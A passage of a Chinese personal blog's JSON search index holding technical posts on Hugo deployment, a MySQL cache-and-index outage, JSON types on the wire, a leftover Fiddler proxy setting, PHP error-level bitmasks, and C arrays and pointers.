lh-title\u0026#34;\u0026gt; 2 \u0026lt;a href=\u0026#34;{{.URL}}\u0026#34; class=\u0026#34;color-inherit dim link\u0026#34;\u0026gt; 3 {{ .Title }} 4 \u0026lt;/a\u0026gt; 5\u0026lt;/h1\u0026gt; 6\u0026lt;h4\u0026gt;{{ .Date.Format \u0026#34;January 2, 2006\u0026#34; }}\u0026lt;/h4\u0026gt; 7\u0026lt;div class=\u0026#34;f6 f5-l lh-copy nested-copy-line-height nested-links\u0026#34;\u0026gt; 8 {{ .Summary }} 9\u0026lt;/div\u0026gt; 文章中嵌入图片\n例如![](/images/room_msg_lifetime.png)，则默认图片的存放路径是static/images/room_msg_lifetime.png\n如果public文件夹为空\nhugo --verbose\n部署 DNS设置CNAME域名映射，新建一个github项目，例如kongoole.github.io，clone到hugo项目中的文件夹public。\n1git clone https://github.com/kongoole/kongoole.github.io public 部署到github参考文档。\n","link":"https://www.qiankun.info/posts/%E6%8A%98%E8%85%BEhugo/","section":"posts","tags":["hugo"],"title":"折腾hugo"},{"body":"","link":"https://www.qiankun.info/tags/cache/","section":"tags","tags":null,"title":"Cache"},{"body":"以为是一次小改动，欢喜自测上线，没多久500扑面而来。上机器，看日志，数据库连接报错。本地客户端连连看，返回如下：\n1ERROR 1203 (42000): User xxx already has more than \u0026#39;max_user_connections\u0026#39; active connections 当前用户的活跃连接超过了max_user_connections的设置，根据文档描述，该设置控制单个MySQL用户能够达到的并发连接数。超过此设置，MySQL连接失败，所有经过数据层的接口都会报500。\n正常情况，这个项目典型的读多写少，读请求占97%以上，缓存早已稳稳加上，绝大多数读请求不会走到数据层，所以一个主库两个从库的连接数比例大概是：\n1S:M:S = 1:2:1 在QPS为300到1000的区间时，主库连接数维持在55左右，而两个从库的连接数均维持在20左右，可见大多数请求已被缓存拦下。但是在出现上面的报错时，主库连接数依然维持在55左右，而两个从库连接数则均达到1200左右，基本所有的压力都集中在了从库，典型的缓存雪崩现象。为什么雪崩？别人家是缓存集中过期，而我们家业务代码修改了缓存key，导致缓存在“逻辑”上全部过期，雪崩。\n如果只是数据层的机器出现访问压力，可能还扛得住。但读请求基本全在操作一张表，一千万左右记录，三列上建了唯一索引，例如\n1A+B+C 以前的查询条件：\n1SELECT * FROM t_name WHERE A=a AND B=b AND C=c; 命中索引，但现在应业务要求要去掉A=a，于是：\n1SELECT * FROM t_name WHERE B=b AND C=c; 不符合最左前缀策略，索引未命中，所有查询全表扫描，大量查询时间在60秒到140秒之间。\n四台机器的php-fpm进程数分别为500、500、900、450，而两个从库连接数2400左右，和所有机器进程数相近。可见，这种并发下所有机器的php-fpm进程都在工作，每台机器都达到了pm.max_children的设置。\n怎么办？先回滚。\n问题出现的逻辑：\n1缓存key被修改 -\u0026gt; 读库 -\u0026gt; 索引没命中 -\u0026gt; 数据库连接数过多 -\u0026gt; 数据库连接失败 -\u0026gt; 500 这种并发，即使雪崩，只要索引命中，读出的数据入缓存，等旧缓存失效，一切照旧。\n调整索引列顺序：\n1B+C+A explain看看：\n1+----+-------------+---------+------+----------------+----------------+---------+-------------+------+-----------------------+ 2| id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra | 3+----+-------------+---------+------+----------------+----------------+---------+-------------+------+-----------------------+ 4| 1 | SIMPLE | xxxxxxx | ref | unq_xxx_xxx_xx | unq_xxx_xxx_xx | 304 | const,const | 1 | Using index condition | 5+----+-------------+---------+------+----------------+----------------+---------+-------------+------+-----------------------+ 61 row in set (0.04 sec) 总结：\n再小的修改，都要考虑下性能、可用性、扩展性、安全性 想清楚开发、测试、线上环境的数量差异对程序性能的影响 上线前最好先预发布测试 访问频率高的缓存key修改后，先预热，避免数据库压力陡增 大数据量表查询一定要explain确认缓存是否命中 备注：\n第三台机器内存\n1$ free -m 2 total used free shared buff/cache available 3Mem: 15885 4016 6163 837 5706 10531 4Swap: 2047 0 2047 平均每个php-fpm进程占内存16M左右\n1ps -eo pid,ppid,command,user,%mem | grep php-fpm 222324 1 php-fpm: master process (/o root 0.0 322325 22324 php-fpm: pool webid webid 0.1 422326 22324 php-fpm: pool webid webid 0.1 522327 22324 php-fpm: pool webid webid 0.1 622328 22324 php-fpm: pool webid webid 0.1 722329 22324 php-fpm: pool webid webid 0.1 822330 22324 php-fpm: pool webid webid 0.1 922331 22324 php-fpm: pool webid webid 0.1 1022332 22324 php-fpm: pool webid webid 0.1 1122333 22324 php-fpm: pool webid webid 0.1 1222334 22324 php-fpm: pool webid webid 0.1 1322335 22324 php-fpm: pool webid webid 0.1 1422336 22324 php-fpm: pool webid webid 0.1 1522337 22324 php-fpm: pool webid webid 0.1 16... ","link":"https://www.qiankun.info/posts/%E7%B4%A2%E5%BC%95%E4%B8%8E%E7%BC%93%E5%AD%98%E7%9A%84%E5%9D%91/","section":"posts","tags":["mysql","cache"],"title":"索引与缓存的坑"},{"body":"","link":"https://www.qiankun.info/tags/network/","section":"tags","tags":null,"title":"Network"},{"body":"使用弱类型语言（PHP、Python等）开发接口的时候，有时会不考虑数据类型的问题，因为语言的解释器会自动进行类型转换。当一种强类型语言根据文档调用弱类型语言开发的接口，此时弱类型语言的开发者如果没去仔细关注返回的数据类型，结果可能给接口调用方造成不便。\n下面的例程使用PHP开发\n1\u0026lt;?php 2header(\u0026#34;Content-type:application/json\u0026#34;); 3$arr = [ 4 \u0026#34;hello\u0026#34; =\u0026gt; \u0026#34;world\u0026#34;, 5 \u0026#34;value\u0026#34; =\u0026gt; \u0026#34;100\u0026#34;, 6 \u0026#34;aaaa\u0026#34; =\u0026gt; 100, 7 \u0026#34;chinese\u0026#34; =\u0026gt; \u0026#34;中文字符\u0026#34; 8]; 9echo json_encode($arr); 抓取http报文后可以看到字符串被转换成二进制后的表示如下\n{% asset_img wireshark.png %}\n整型100和字符串\u0026quot;100\u0026quot;的二进制表示的区别在于字符串\u0026quot;100\u0026quot;比整型100多出了两个双引号(\u0026quot;\u0026quot;)\n1整型100 =\u0026gt; 00110001 00110000 00110000 2字符串\u0026#34;100\u0026#34; =\u0026gt; 00100010 00110001 00110000 00110000 00100010 双引号(\u0026quot;)、1和0的ascii码的二进制表示形式是\n1\u0026#34; =\u0026gt; 00100010 21 =\u0026gt; 00110001 30 =\u0026gt; 00110000 所以整型100和字符串\u0026quot;100\u0026quot;在网络传输过程中本质上都是字符串，需要通过ascii转换成对应的二进制。注意，这里中文字符串被转换成了unicode，然后对unicode中的每个字符又对应到ascii转换成相应的二进制，例如：\n1中 -\u0026gt; \\u4e2d -\u0026gt; 01011100 01110101 00110100 01100101 00110010 01100100 2符 -\u0026gt; \\u7b26 -\u0026gt; 01011100 01110101 00110111 01100010 00110010 00110110 虽然本质上都是字符串，但http报文被解析之后在应用层的表现形式会是各种数据类型，进而在内存中占用不同的空间。\n","link":"https://www.qiankun.info/posts/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%9C%A8%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%8E%B0/","section":"posts","tags":["network"],"title":"数据类型在网络传输中的表现"},{"body":"昨天下班前按照这里描述装了Fiddler，手机wifi设置代理通过PC上的Fiddler作为代理服务器向外网发送http(s)请求 。\n早上来到，关掉Fiddler，发现所有请求都被代理到127.0.0.1:8888\n1$ curl http://www.baidu.com 2curl: (7) Failed to connect to 127.0.0.1 port 8888: Connection refused 并没有手动更改过网络代理，而登录进来就自动设置了代理，所以需要查看下登录login shells时执行的文件\n1cat ~/.profile 2... 3# if running bash 4if [ -n \u0026#34;$BASH_VERSION\u0026#34; ]; then 5 # include .bashrc if it exists 6 if [ -f \u0026#34;$HOME/.bashrc\u0026#34; ]; then 7\t. \u0026#34;$HOME/.bashrc\u0026#34; 8 fi 9fi 10... 1$ cat ~/.bashrc 2... 3export http_proxy=\u0026#39;127.0.0.1:8888\u0026#39; 4export https_proxy=\u0026#39;127.0.0.1:8888\u0026#39; 5export ftp_proxy=\u0026#39;\u0026#39; 6export socks_proxy=\u0026#39;\u0026#39; 1$ ll ~/.bashrc 2-rw-r--r-- 1 zhangqiankun root 4099 1月 29 17:38 /home/zhangqiankun/.bashrc .bashrc文件的修改时间正是打开Fiddler的时间，于是删除最后四行重新启动Fiddler发现.bashrc文件又被写入了。\n暂时还不清楚的是Fiddler是如何更改系统网络配置的，而且这种更改发生后，如果终止Fiddler进程，即相应的代理服务器被终止之后，所有的http(s)请求都会因此失败，例如：\n1$ curl http://www.baidu.com 2curl: (7) Failed to connect to 127.0.0.1 port 8888: Connection refused 查看网络代理配置，依旧是被修改后的样子\n只好删除.bashrc写入的配置，手动改回网络代理配置。\n","link":"https://www.qiankun.info/posts/%E4%BB%A3%E7%90%86%E5%B0%8F%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/","section":"posts","tags":["network"],"title":"代理小故障排查"},{"body":"","link":"https://www.qiankun.info/tags/php/","section":"tags","tags":null,"title":"PHP"},{"body":"首先，我们要解决的第一个问题是\n什么是位运算？\n按照wikipedia中的说法，位运算有如下的含义\n位运算操作的是二进制数 对二进制数在位级别上进行运算 效率通常比普通的加减乘除快（为什么快的问题有待解决） 其次，我们要解决的问题是\n什么是PHP的错误级别？\n根据错误产生的原因，PHP将错误分成若干类，参见文档。每一种错误对应一个全局常量，可以用来组合，得到的结果作为参数传递给error_reporting()函数，PHP就能知道哪些错误应该被忽略，哪些错误应该被显示或记录日志。接下来，又引出一个问题\n表示每一种错误的全局常量是如何被组合的？\n在配置文件中的配置项error_reporting或者传递给error_reporting()的参数中，通过对表示错误的常量进行位运算来组合错误种类，从而决定要处理哪些错误。\n假定有符号整型在机器上占4个字节，32位。我们先看看表示错误的全局常量和其对应值的十进制与二进制表示\n常量 十进制 二进制 E_ERROR 1 00000000 00000000 00000000 00000001 E_WARNING 2 00000000 00000000 00000000 00000010 E_PARSE 4 00000000 00000000 00000000 00000100 E_NOTICE 8 00000000 00000000 00000000 00001000 E_CORE_ERROR 16 00000000 00000000 00000000 00010000 E_CORE_WARNING 32 00000000 00000000 00000000 00100000 E_COMPILE_ERROR 64 00000000 00000000 00000000 01000000 E_COMPILE_WARNING 128 00000000 00000000 00000000 10000000 E_USER_ERROR 256 00000000 00000000 00000001 00000000 E_USER_WARNING 512 00000000 00000000 00000010 00000000 E_USER_NOTICE 1024 00000000 00000000 00000100 00000000 E_STRICT 2048 00000000 00000000 00001000 00000000 E_RECOVERABLE_ERROR 4096 00000000 00000000 00010000 00000000 E_DEPRECATED 8192 00000000 00000000 00100000 00000000 E_USER_DEPRECATED 16384 00000000 00000000 01000000 00000000 E_ALL 32767 00000000 00000000 01111111 11111111 知道了要通过位运算组合错误种类，接下来的问题便是\n如何通过位运算来组合出我们想要的错误种类？\n首先，我们看看位运算符有哪些，参见文档\n例子 名称 结果 $a \u0026amp; $b And（按位与） 将把 $a 和 $b 中都为 1 的位设为 1。 $a | $b Or（按位或） 将把 $a 和 $b 中任何一个为 1 的位设为 1。 $a ^ $b Xor（按位异或） 将把 $a 和 $b 中一个为 1 另一个为 0 的位设为 1。 ~ $a Not（按位取反） 将 $a 中为 0 的位设为 1，反之亦然。 $a \u0026lt;\u0026lt; $b Shift left（左移） 将 $a 中的位向左移动 $b 次（每一次移动都表示“乘以 2”）。 $a \u0026gt;\u0026gt; $b Shift right（右移） 将 $a 中的位向右移动 $b 次（每一次移动都表示“除以 2”）。 利用这些运算符和预定义常量，就能对错误种类进行组合。假如，我们希望处理以下几种错误组合\n所有错误都不处理 处理E_ALL 中除了E_NOTICE类型错误 只处理E_ERROR和E_WARNING类型错误 第一个，显然要对E_ALL取反，即~E_ALL，二进制值运算式\n1~ 00000000 00000000 01111111 11111111 结果为\n111111111 11111111 10000000 00000000 所有类型错误对应的位均被置0，表示所有错误将不会被显示。\n例程如下\n1\u0026lt;?php 2ini_set(\u0026#39;display_errors\u0026#39;, true); 3error_reporting(~E_ALL); 4 5 6// E_NOTICE 7echo $var; 8 9// E_USER_DEPRECATED 10trigger_error (\u0026#39;deprecated error triggered\u0026#39;, E_USER_DEPRECATED); 11 12// E_WARNING 13$a = 2048/0; 14 15// E_ERROR 16func(); 运行，没有任何输出。\n第二个，转换成位运算表示为E_ALL \u0026amp; ~E_NOTICE，对应的二进制运算式\n1 00000000 00000000 01111111 11111111 2\u0026amp; 11111111 11111111 11111111 11110111 结果为\n100000000 00000000 01111111 11110111 除了E_NOTICE对应的位为0，其他类型错误对应的位均为1，表示只有E_NOTICE不会被显示。\n例程如下：\n1\u0026lt;?php 2ini_set(\u0026#39;display_errors\u0026#39;, true); 3error_reporting(E_ALL \u0026amp; ~E_NOTICE); 4 5 6// E_NOTICE 7echo $var; 8 9// E_USER_DEPRECATED 10trigger_error (\u0026#39;deprecated error triggered\u0026#39;, E_USER_DEPRECATED); 11 12// E_WARNING 13$a = 2048/0; 14 15// E_ERROR 16func(); 运行，输出\n1Deprecated: deprecated error triggered in /usr/local/var/www/test/index.php on line 10 2Warning: Division by zero in /usr/local/var/www/test/index.php on line 13 3Fatal error: Uncaught Error: Call to undefined function func() in /usr/local/var/www/test/index.php:16 除了E_NOTICE级别的错误，E_WARNING、E_ERROR和E_USER_DEPRECATED级别的错误均被显示。\n第三个，转换成位运算表示为E_ERROR | E_WARNING，对应的二进制运算式\n1 00000000 00000000 00000000 00000001 2| 00000000 00000000 00000000 00000010 结果为\n100000000 00000000 00000000 00000011 E_ERROR和E_WARNING对应的位为1，其他类型错误对应的位为0，表示只有E_ERROR和E_WARNING类型的错误将被显示。\n例程如下：\n1\u0026lt;?php 2ini_set(\u0026#39;display_errors\u0026#39;, true); 3error_reporting(E_ERROR | E_WARNING); 4 5 6// E_NOTICE 7echo $var; 8 9// E_USER_DEPRECATED 10trigger_error (\u0026#39;deprecated error triggered\u0026#39;, E_USER_DEPRECATED); 11 12// E_WARNING 13$a = 2048/0; 14 15// E_ERROR 16func(); 运行，输出\n1PHP Warning: Division by zero in /usr/local/var/www/test/index.php on line 13 2PHP Fatal error: Uncaught Error: Call to undefined function func() in /usr/local/var/www/test/index.php:16 除了E_NOTICE和E_USER_DEPRECATED级别的错误，E_WARNING和E_ERROR级别的错误均被显示。\n以上，便是位运算在PHP错误级别中的运用。\n其他需要探究的问题\nPHP为什么使用位运算处理错误级别的组合？ 有没有其他类似的位运算应用？ 为什么位运算速度快？ ","link":"https://www.qiankun.info/posts/%E4%BD%8D%E8%BF%90%E7%AE%97%E5%9C%A8php%E9%94%99%E8%AF%AF%E7%BA%A7%E5%88%AB%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/","section":"posts","tags":["PHP"],"title":"位运算在PHP错误级别中的运用"},{"body":"","link":"https://www.qiankun.info/tags/c%E8%AF%AD%E8%A8%80/","section":"tags","tags":null,"title":"C语言"},{"body":"先看段代码\n1\tint arr[] = {344,243,55,6,10}; 2\tfor (int i = 0; i \u0026lt; 5; i++) 3 printf(\u0026#34;%p\\n\u0026#34;, \u0026amp;arr[i]); 数组arr的每个元素的地址，依次被打印，运行结果如下\n10x7fff5c45b590 20x7fff5c45b594 30x7fff5c45b598 40x7fff5c45b59c 50x7fff5c45b5a0 每个地址相差4，正好是一个int型整数占的字节数。\n问题来了，是不是每个元素的地址，正好相差元素数据类型所占的字节数呢？\n答案：是的。\n再来看段代码验证一下\n1\tchar arr[] = \u0026#34;abcd\u0026#34;; 2\tfor (int i = 0; i \u0026lt; 4; i++) 3\tprintf(\u0026#34;%p\\n\u0026#34;, \u0026amp;arr[i]); 4 5\tfor (int i = 0; i \u0026lt; 14; i++) 6\tprintf(\u0026#34;-\u0026#34;); 7 8\tprintf(\u0026#34;\\n\u0026#34;); 9 10\tdouble arr2[] = {10.000, 13.2, 15.6, 123.678}; 11\tfor (int i = 0; i \u0026lt; 4; i++) 12\tprintf(\u0026#34;%p\\n\u0026#34;, \u0026amp;arr2[i]); 运行结果\n10x7fff5c2c8577 20x7fff5c2c8578 30x7fff5c2c8579 40x7fff5c2c857a 50x7fff5c2c857b 6-------------- 70x7fff5c2c8580 80x7fff5c2c8588 90x7fff5c2c8590 100x7fff5c2c8598 110x7fff5c2c85a0 字符串可被看作字符数组，每个字符占1个字节，地址相差1。\n双精度型数组，每个元素占8个字节，地址相差8。\n可见，上面的结论是对的。\n地址到底指什么呢？\n依据这里的描述\nThe address of a variable is the address of its first byte of storage that it occupies\n每个变量可能会占若干字节，变量地址指的是它所占的第一个字节的地址。\n所以，当我们打印数组每个元素的地址时，实际上是在打印每个元素所占的第一个字节的地址。\n说到地址，自然想到指针，于是我们想知道\n究竟啥是指针？\n通常所说的指针是指指针变量，这种变量的值是十六进制的地址，而该地址可能属于另一个变量。所以，通过指针变量可以取到它所存的地址所属的变量（或许没有变量）的值。举个例子\n1\tint a = 100; 2\tint *p; 3\tp = \u0026amp;a; 4 5\tprintf(\u0026#34;%p\\n\u0026#34;, p); 6\tprintf(\u0026#34;%d\\n\u0026#34;, *p); p是指针变量，它的值是变量a的地址，通过*p获取到a的值。运行结果\n10x7fff5065d5a8 2100 再回到数组，做个实验\n1\tint arr[] = {344,243,55,6,10}; 2\tprintf(\u0026#34;%p\\n\u0026#34;, arr); 3\tprintf(\u0026#34;%p\\n\u0026#34;, \u0026amp;arr[0]); 运行结果\n10x7fff5d0d0590 20x7fff5d0d0590 可见，数组名arr本身可被看作一个指针变量，它保存的正是第一个元素的地址。在c语言中，arr+1表示指针指向下一个元素的地址，所以，下面的等式是成立的\n1arr+n = \u0026amp;(arr[n]) 2*(arr+n) = arr[n] 综上所描述，可得结论\n数组名可看作指向数组第一个元素的指针，指针加n，则指向数组第n个元素\n","link":"https://www.qiankun.info/posts/c%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88/","section":"posts","tags":["c语言"],"title":"C语言中的数组和指针"},{"body":"","link":"https://www.qiankun.info/archives/","section":"","tags":null,"title":""},{"body":" 工作在魔都 曾供职七牛云、爱奇艺、苏宁等 常用的编程语言是 Go，偶尔也用 PHP、Python、Rust 定居在美丽的昆山。 学无止境，持续贡献。 ","link":"https://www.qiankun.info/about/","section":"","tags":null,"title":"About"},{"body":"","link":"https://www.qiankun.info/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://www.qiankun.info/series/","section":"series","tags":null,"title":"Series"}]